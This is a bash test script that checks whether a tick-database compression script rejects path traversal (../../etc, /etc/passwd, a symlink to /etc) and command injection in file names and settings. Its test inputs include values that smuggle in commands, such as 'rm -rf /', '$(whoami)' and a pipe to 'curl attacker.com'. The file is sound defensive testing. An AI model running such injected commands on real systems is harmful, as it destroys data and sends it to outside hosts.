#!/bin/bash
# ============================================================================
# SECURITY TEST SUITE
# ============================================================================
# Purpose: Verify path traversal and command injection fixes
# Usage: ./test_security_fixes.sh
# ============================================================================

set -euo pipefail

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

SCRIPT="./compress_old_dbs.sh"
TEST_DIR="data/ticks/db/security_test"
PASSED=0
FAILED=0

# Cleanup function
cleanup() {
    echo -e "\n${BLUE}[CLEANUP]${NC} Removing test files..."
    rm -rf data/ticks/db/security_test 2>/dev/null || true
    rm -f malicious_link 2>/dev/null || true
    rm -f -- "-rf.db" 2>/dev/null || true
    rm -f "test.db; echo HACKED" 2>/dev/null || true
    rm -f "test.db\$(whoami).db" 2>/dev/null || true
    rm -f "test.db | curl attacker.com" 2>/dev/null || true
    rm -f "test.db && rm -rf /" 2>/dev/null || true
    rm -f "malicious; rm -rf /.db.zst" 2>/dev/null || true
}

# Setup
setup() {
    echo -e "${BLUE}[SETUP]${NC} Creating test environment..."
    cleanup
    mkdir -p "$TEST_DIR"
}

# Test result helper
test_result() {
    local test_name="$1"
    local expected="$2"
    local actual="$3"

    if [[ "$actual" == "$expected" ]]; then
        echo -e "${GREEN}✓ PASS${NC}: $test_name"
        PASSED=$((PASSED + 1))
    else
        echo -e "${RED}✗ FAIL${NC}: $test_name"
        echo -e "  Expected: $expected"
        echo -e "  Got: $actual"
        FAILED=$((FAILED + 1))
    fi
}

# Test Suite 1: Path Traversal Prevention
echo -e "\n${BLUE}═══════════════════════════════════════════════${NC}"
echo -e "${BLUE}TEST SUITE 1: PATH TRAVERSAL PREVENTION${NC}"
echo -e "${BLUE}═══════════════════════════════════════════════${NC}\n"

# Test 1.1: Parent directory traversal
echo -e "${YELLOW}[TEST 1.1]${NC} Parent directory traversal (../../etc)"
OUTPUT=$(DB_DIR="../../etc" VERBOSE=false "$SCRIPT" 2>&1 || true)
if [[ "$OUTPUT" == *"Security violation"* ]] && [[ "$OUTPUT" == *"must be within data/ticks"* ]]; then
    test_result "Parent directory traversal blocked" "BLOCKED" "BLOCKED"
else
    test_result "Parent directory traversal blocked" "BLOCKED" "NOT_BLOCKED"
fi

# Test 1.2: Absolute path outside allowed base
echo -e "${YELLOW}[TEST 1.2]${NC} Absolute path (/etc/passwd)"
OUTPUT=$(DB_DIR="/etc/passwd" VERBOSE=false "$SCRIPT" 2>&1 || true)
if [[ "$OUTPUT" == *"Security violation"* ]] && [[ "$OUTPUT" == *"must be within data/ticks"* ]]; then
    test_result "Absolute path outside base blocked" "BLOCKED" "BLOCKED"
else
    test_result "Absolute path outside base blocked" "BLOCKED" "NOT_BLOCKED"
fi

# Test 1.3: Symlink to sensitive directory
echo -e "${YELLOW}[TEST 1.3]${NC} Symlink to /etc"
ln -s /etc malicious_link 2>/dev/null || true
OUTPUT=$(DB_DIR="malicious_link" VERBOSE=false "$SCRIPT" 2>&1 || true)
if [[ "$OUTPUT" == *"Security violation"* ]] || [[ "$OUTPUT" == *"invalid"* ]]; then
    test_result "Symlink to sensitive directory blocked" "BLOCKED" "BLOCKED"
else
    test_result "Symlink to sensitive directory blocked" "BLOCKED" "NOT_BLOCKED"
fi
rm -f malicious_link

# Test 1.4: Non-existent path
echo -e "${YELLOW}[TEST 1.4]${NC} Non-existent path"
OUTPUT=$(DB_DIR="nonexistent/path/that/does/not/exist" VERBOSE=false "$SCRIPT" 2>&1 || true)
if [[ "$OUTPUT" == *"invalid"* ]] || [[ "$OUTPUT" == *"does not exist"* ]]; then
    test_result "Non-existent path rejected" "REJECTED" "REJECTED"
else
    test_result "Non-existent path rejected" "REJECTED" "NOT_REJECTED"
fi

# Test 1.5: Valid path (should succeed)
echo -e "${YELLOW}[TEST 1.5]${NC} Valid path (data/ticks/db/security_test)"
OUTPUT=$(DB_DIR="$TEST_DIR" VERBOSE=false "$SCRIPT" 2>&1 || true)
if [[ "$OUTPUT" != *"Security violation"* ]] && [[ "$OUTPUT" != *"ERROR"* ]]; then
    test_result "Valid path accepted" "ACCEPTED" "ACCEPTED"
else
    test_result "Valid path accepted" "ACCEPTED" "REJECTED"
fi

# Test 1.6: Invalid compression level
echo -e "${YELLOW}[TEST 1.6]${NC} Invalid compression level (99)"
OUTPUT=$(COMPRESSION_LEVEL=99 VERBOSE=false "$SCRIPT" 2>&1 || true)
if [[ "$OUTPUT" == *"Invalid COMPRESSION_LEVEL"* ]]; then
    test_result "Invalid compression level rejected" "REJECTED" "REJECTED"
else
    test_result "Invalid compression level rejected" "REJECTED" "ACCEPTED"
fi

# Test 1.7: Compression level injection attempt
echo -e "${YELLOW}[TEST 1.7]${NC} Compression level command injection"
OUTPUT=$(COMPRESSION_LEVEL="5; echo HACKED" VERBOSE=false "$SCRIPT" 2>&1 || true)
if [[ "$OUTPUT" == *"Invalid COMPRESSION_LEVEL"* ]] && [[ "$OUTPUT" != *"HACKED"* ]]; then
    test_result "Compression level injection blocked" "BLOCKED" "BLOCKED"
else
    test_result "Compression level injection blocked" "BLOCKED" "NOT_BLOCKED"
fi

# Test Suite 2: Command Injection Prevention
echo -e "\n${BLUE}═══════════════════════════════════════════════${NC}"
echo -e "${BLUE}TEST SUITE 2: COMMAND INJECTION PREVENTION${NC}"
echo -e "${BLUE}═══════════════════════════════════════════════${NC}\n"

# Create a valid test database
TEST_DB="$TEST_DIR/ticks_2020-01-01.db"
sqlite3 "$TEST_DB" "CREATE TABLE test(id INT);" 2>/dev/null || true

# Test 2.1: Semicolon injection in filename
echo -e "${YELLOW}[TEST 2.1]${NC} Semicolon injection (test.db; echo HACKED)"
touch "$TEST_DIR/test.db; echo HACKED" 2>/dev/null || true
OUTPUT=$(DAYS_BEFORE_COMPRESS=0 DB_DIR="$TEST_DIR" VERBOSE=false "$SCRIPT" 2>&1 || true)
if [[ "$OUTPUT" == *"Invalid filename format"* ]] && [[ "$OUTPUT" != *"HACKED"* ]]; then
    test_result "Semicolon injection blocked" "BLOCKED" "BLOCKED"
else
    test_result "Semicolon injection blocked" "BLOCKED" "NOT_BLOCKED"
fi

# Test 2.2: Command substitution
echo -e "${YELLOW}[TEST 2.2]${NC} Command substitution (test.db\$(whoami).db)"
touch "$TEST_DIR/test.db\$(whoami).db" 2>/dev/null || true
OUTPUT=$(DAYS_BEFORE_COMPRESS=0 DB_DIR="$TEST_DIR" VERBOSE=false "$SCRIPT" 2>&1 || true)
if [[ "$OUTPUT" == *"Invalid filename format"* ]]; then
    test_result "Command substitution blocked" "BLOCKED" "BLOCKED"
else
    test_result "Command substitution blocked" "BLOCKED" "NOT_BLOCKED"
fi

# Test 2.3: Pipe injection
echo -e "${YELLOW}[TEST 2.3]${NC} Pipe injection (test.db | curl attacker.com)"
touch "$TEST_DIR/test.db | curl attacker.com" 2>/dev/null || true
OUTPUT=$(DAYS_BEFORE_COMPRESS=0 DB_DIR="$TEST_DIR" VERBOSE=false "$SCRIPT" 2>&1 || true)
if [[ "$OUTPUT" == *"Invalid filename format"* ]]; then
    test_result "Pipe injection blocked" "BLOCKED" "BLOCKED"
else
    test_result "Pipe injection blocked" "BLOCKED" "NOT_BLOCKED"
fi

# Test 2.4: Flag injection (filename starting with -)
echo -e "${YELLOW}[TEST 2.4]${NC} Flag injection (-rf.db)"
touch -- "$TEST_DIR/-rf.db" 2>/dev/null || true
OUTPUT=$(DAYS_BEFORE_COMPRESS=0 DB_DIR="$TEST_DIR" VERBOSE=false "$SCRIPT" 2>&1 || true)
if [[ "$OUTPUT" == *"Invalid filename format"* ]]; then
    test_result "Flag injection blocked" "BLOCKED" "BLOCKED"
else
    test_result "Flag injection blocked" "BLOCKED" "NOT_BLOCKED"
fi

# Test 2.5: Ampersand injection
echo -e "${YELLOW}[TEST 2.5]${NC} Ampersand injection (test.db && rm -rf /)"
touch "$TEST_DIR/test.db && rm -rf /" 2>/dev/null || true
OUTPUT=$(DAYS_BEFORE_COMPRESS=0 DB_DIR="$TEST_DIR" VERBOSE=false "$SCRIPT" 2>&1 || true)
if [[ "$OUTPUT" == *"Invalid filename format"* ]]; then
    test_result "Ampersand injection blocked" "BLOCKED" "BLOCKED"
else
    test_result "Ampersand injection blocked" "BLOCKED" "NOT_BLOCKED"
fi

# Test 2.6: Valid filename (should succeed)
echo -e "${YELLOW}[TEST 2.6]${NC} Valid filename (ticks_2020-01-01.db)"
OUTPUT=$(DAYS_BEFORE_COMPRESS=0 DB_DIR="$TEST_DIR" VERBOSE=false "$SCRIPT" 2>&1 || true)
if [[ "$OUTPUT" != *"Invalid filename format"* ]] && [[ "$OUTPUT" != *"Security violation"* ]]; then
    test_result "Valid filename accepted" "ACCEPTED" "ACCEPTED"
else
    test_result "Valid filename accepted" "ACCEPTED" "REJECTED"
fi

# Test 2.7: Decompress with malicious filename
echo -e "${YELLOW}[TEST 2.7]${NC} Decompress malicious filename"
touch "$TEST_DIR/malicious; rm -rf /.db.zst" 2>/dev/null || true
OUTPUT=$("$SCRIPT" decompress "$TEST_DIR/malicious; rm -rf /.db.zst" 2>&1 || true)
if [[ "$OUTPUT" == *"Invalid"* ]] && [[ "$OUTPUT" != *"HACKED"* ]]; then
    test_result "Malicious decompress filename blocked" "BLOCKED" "BLOCKED"
else
    test_result "Malicious decompress filename blocked" "BLOCKED" "NOT_BLOCKED"
fi

# Summary
cleanup

echo -e "\n${BLUE}═══════════════════════════════════════════════${NC}"
echo -e "${BLUE}TEST SUMMARY${NC}"
echo -e "${BLUE}═══════════════════════════════════════════════${NC}"
echo -e "${GREEN}Passed:${NC} $PASSED"
echo -e "${RED}Failed:${NC} $FAILED"
echo -e "${BLUE}Total:${NC}  $((PASSED + FAILED))"

if [ $FAILED -eq 0 ]; then
    echo -e "\n${GREEN}✅ ALL TESTS PASSED - Security fixes verified${NC}\n"
    exit 0
else
    echo -e "\n${RED}❌ SOME TESTS FAILED - Review security implementation${NC}\n"
    exit 1
fi
